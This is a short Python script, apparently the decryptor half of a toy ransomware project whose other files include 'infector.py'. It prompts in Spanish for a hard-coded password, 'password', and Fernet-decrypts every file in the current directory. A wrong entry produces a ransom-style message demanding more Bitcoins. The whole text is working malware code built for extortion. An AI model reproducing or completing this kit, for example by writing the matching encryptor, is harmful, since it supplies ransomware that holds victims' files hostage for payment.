#!/usr/bin/env python3

import os
from cryptography.fernet import Fernet

files = []

for file in os.listdir():
    if file == "infector.py" or file == "decrypt.key" or file == "decrypt.py":
        continue
    if os.path.isfile(file):
        files.append(file)

with open("decrypt.key", "rb") as key:
    secretKey = key.read()

secretPhrase = "password"

while True:
    user_phrase = input("Escribe la contraseña para descifrar tus archivos\n")

    if user_phrase == secretPhrase:
        for file in files:
            with open(file, "rb") as f:
                contents = f.read()
            contents_decrypted = Fernet(secretKey).decrypt(contents)

            with open(file, "wb") as f:
                f.write(contents_decrypted)
        print("Felicidades, tus archivos has sido descifrados correctamente")
        break
    else:
        print("Error, contraseña incorrecta, envíame mas Bitcoins")
